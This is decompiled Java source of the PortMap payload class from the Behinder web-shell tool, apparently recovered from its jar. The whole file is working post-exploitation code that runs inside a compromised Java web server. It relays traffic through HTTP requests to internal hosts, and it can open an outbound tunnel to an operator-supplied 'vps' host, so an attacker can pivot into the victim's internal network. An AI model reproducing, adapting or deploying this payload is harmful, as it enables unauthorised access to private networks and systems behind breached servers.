package net.rebeyond.behinder.payload.java;

import java.io.IOException;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.nio.ByteBuffer;
import java.nio.channels.SocketChannel;
import java.util.Enumeration;
import javax.servlet.ServletOutputStream;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import javax.servlet.jsp.PageContext;

public class PortMap
        implements Runnable {
    public static String action;
    public static String targetIP;
    public static String targetPort;
    public static String socketHash;
    public static String remoteIP;
    public static String remotePort;
    public static String extraData;
    private HttpServletRequest Request;
    private HttpServletResponse Response;
    private HttpSession Session;
    String localKey;
    String remoteKey;
    String type;
    HttpSession httpSession;

    public boolean equals(Object obj) {
        PageContext page = (PageContext) obj;
        this.Session = page.getSession();
        this.Response = (HttpServletResponse) page.getResponse();
        this.Request = (HttpServletRequest) page.getRequest();

        try {
            portMap(page);
        } catch (Exception exception) {
        }


        return true;
    }

    public boolean equals1(HttpServletRequest request, HttpServletResponse response) {
        PageContext page = (PageContext) null;
        this.Session = request.getSession();
        this.Response = response;
        this.Request = request;

        try {
            portMap(page);
        } catch (Exception exception) {
        }


        return true;
    }


    public void portMap(PageContext page) throws Exception {
        String localSessionKey = "local_" + targetIP + "_" + targetPort + "_" + socketHash;
        if (action.equals("createLocal")) {

            try {
                String target = targetIP;
                int port = Integer.parseInt(targetPort);
                SocketChannel socketChannel = SocketChannel.open();
                socketChannel.connect(new InetSocketAddress(target, port));
                socketChannel.configureBlocking(false);
                this.Session.setAttribute(localSessionKey, socketChannel);
                this.Response.setStatus(200);
            } catch (Exception e) {

                e.printStackTrace();
                ServletOutputStream so = null;
                try {
                    so = this.Response.getOutputStream();
                    so.write(new byte[]{55, 33, 73, 54});
                    so.write(e.getMessage().getBytes());
                    so.flush();
                    so.close();
                } catch (IOException ioException) {
                    ioException.printStackTrace();
                }

            }

        } else if (action.equals("read")) {

            SocketChannel socketChannel = (SocketChannel) this.Session.getAttribute(localSessionKey);
            if (socketChannel == null)
                return;
            try {
                ByteBuffer buf = ByteBuffer.allocate(512);
                socketChannel.configureBlocking(false);
                int bytesRead = socketChannel.read(buf);
                ServletOutputStream so = this.Response.getOutputStream();
                while (bytesRead > 0) {
                    so.write(buf.array(), 0, bytesRead);
                    so.flush();
                    buf.clear();
                    bytesRead = socketChannel.read(buf);
                }


                so.flush();
                so.close();
            } catch (Exception e) {
                e.printStackTrace();
                this.Response.setStatus(200);
                ServletOutputStream so = null;
                try {
                    so = this.Response.getOutputStream();
                    so.write(new byte[]{55, 33, 73, 54});
                    so.write(e.getMessage().getBytes());
                    so.flush();
                    so.close();
                    socketChannel.socket().close();
                } catch (IOException ioException) {
                    ioException.printStackTrace();
                }

            }
        } else if (action.equals("write")) {


            SocketChannel socketChannel = (SocketChannel) this.Session.getAttribute(localSessionKey);

            try {
                byte[] extraDataByte = base64decode(extraData);
                ByteBuffer buf = ByteBuffer.allocate(extraDataByte.length);
                buf.clear();
                buf.put(extraDataByte);
                buf.flip();
                while (buf.hasRemaining()) {
                    socketChannel.write(buf);
                }
            } catch (Exception e) {
                ServletOutputStream so = null;
                try {
                    so = this.Response.getOutputStream();
                    so.write(new byte[]{55, 33, 73, 54});
                    so.write(e.getMessage().getBytes());
                    so.flush();
                    so.close();
                    socketChannel.socket().close();
                } catch (IOException ioException) {
                    ioException.printStackTrace();
                }

            }

        } else if (action.equals("closeLocal")) {

            Enumeration attributeNames = this.Session.getAttributeNames();
            while (attributeNames.hasMoreElements()) {
                String attrName = attributeNames.nextElement().toString();
                if (attrName.startsWith("local_")) {
                    this.Session.removeAttribute(attrName);
                }
            }

        } else if (action.equals("createRemote")) {

            (new Thread(new PortMap(this.localKey, this.remoteKey, "create", this.Session))).start();
            this.Response.setStatus(200);


        } else if (action.equals("closeRemote")) {

            this.Session.setAttribute("remoteRunning", Boolean.valueOf(false));
            Enumeration attributeNames = this.Session.getAttributeNames();
            while (attributeNames.hasMoreElements()) {

                String attrName = attributeNames.nextElement().toString();
                if (attrName.startsWith("remote")) {
                    this.Session.removeAttribute(attrName);
                }
            }
        }
    }


    public PortMap(String localKey, String remoteKey, String type, HttpSession session) {
        this.localKey = localKey;
        this.remoteKey = remoteKey;
        this.httpSession = session;
        this.type = type;
    }


    public PortMap() {
    }


    public void run() {
        if (this.type.equals("create")) {

            this.httpSession.setAttribute("remoteRunning", Boolean.valueOf(true));
            while (((Boolean) this.httpSession.getAttribute("remoteRunning")).booleanValue()) {
                try {
                    String target = targetIP;
                    int port = Integer.parseInt(targetPort);
                    String vps = remoteIP;
                    int vpsPort = Integer.parseInt(remotePort);

                    SocketChannel remoteSocketChannel = SocketChannel.open();
                    remoteSocketChannel.connect(new InetSocketAddress(vps, vpsPort));


                    String remoteKey = "remote_remote_" + remoteSocketChannel.socket().getLocalPort() + "_" + targetIP + "_" + targetPort;
                    this.httpSession.setAttribute(remoteKey, remoteSocketChannel);
                    int bytesRead = 0;
                    ByteBuffer buf = ByteBuffer.allocate(512);
                    if ((bytesRead = remoteSocketChannel.read(buf)) > 0) {
                        remoteSocketChannel.configureBlocking(true);
                        SocketChannel localSocketChannel = SocketChannel.open();
                        localSocketChannel.connect(new InetSocketAddress(target, port));
                        localSocketChannel.configureBlocking(true);
                        String localKey = "remote_local_" + localSocketChannel.socket().getLocalPort() + "_" + targetIP + "_" + targetPort;
                        this.httpSession.setAttribute(localKey, localSocketChannel);
                        localSocketChannel.socket().getOutputStream().write(buf.array(), 0, bytesRead);
                        (new Thread(new PortMap(localKey, remoteKey, "read", this.httpSession))).start();
                        (new Thread(new PortMap(localKey, remoteKey, "write", this.httpSession))).start();

                    }

                } catch (Exception e) {

                    e.printStackTrace();
                }

            }

        } else if (this.type.equals("read")) {

            while (((Boolean) this.httpSession.getAttribute("remoteRunning")).booleanValue()) {
                try {
                    SocketChannel localSocketChannel = (SocketChannel) this.httpSession.getAttribute(this.localKey);
                    SocketChannel remoteSocketChannel = (SocketChannel) this.httpSession.getAttribute(this.remoteKey);
                    ByteBuffer buf = ByteBuffer.allocate(512);
                    int bytesRead = localSocketChannel.read(buf);
                    OutputStream so = remoteSocketChannel.socket().getOutputStream();
                    while (bytesRead > 0) {
                        so.write(buf.array(), 0, bytesRead);
                        so.flush();
                        buf.clear();
                        bytesRead = localSocketChannel.read(buf);
                    }
                    so.flush();
                    so.close();
                } catch (IOException e) {
                    try {
                        Thread.sleep(10L);
                    } catch (Exception exception) {
                    }

                }

            }

        } else if (this.type.equals("write")) {

            while (((Boolean) this.httpSession.getAttribute("remoteRunning")).booleanValue()) {

                try {
                    SocketChannel localSocketChannel = (SocketChannel) this.httpSession.getAttribute(this.localKey);
                    SocketChannel remoteSocketChannel = (SocketChannel) this.httpSession.getAttribute(this.remoteKey);
                    ByteBuffer buf = ByteBuffer.allocate(512);
                    int bytesRead = remoteSocketChannel.read(buf);
                    OutputStream so = localSocketChannel.socket().getOutputStream();
                    while (bytesRead > 0) {
                        so.write(buf.array(), 0, bytesRead);
                        so.flush();
                        buf.clear();
                        bytesRead = remoteSocketChannel.read(buf);
                    }
                    so.flush();
                    so.close();
                } catch (IOException e) {
                    try {
                        Thread.sleep(10L);
                    } catch (Exception exception) {
                    }
                }
            }
        }
    }


    private byte[] base64decode(String text) throws Exception {
        String version = System.getProperty("java.version");
        byte[] result = null;

        try {
            if (version.compareTo("1.9") >= 0) {
                getClass();
                Class<?> Base64 = Class.forName("java.util.Base64");
                Object Decoder = Base64.getMethod("getDecoder", null).invoke(Base64, null);
                result = (byte[]) Decoder.getClass().getMethod("decode", new Class[]{String.class}).invoke(Decoder, new Object[]{text});
            } else {
                getClass();
                Class<?> Base64 = Class.forName("sun.misc.BASE64Decoder");
                Object Decoder = Base64.newInstance();
                result = (byte[]) Decoder.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(Decoder, new Object[]{text});
            }

        } catch (Exception exception) {
        }


        return result;
    }
}


/* Location:              /Users/kongzhen/kz_s3c/Behinder_v3.0_Beta_6_mac/Behinder_v3.0_Beta6_mac.jar!/net/rebeyond/behinder/payload/java/PortMap.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */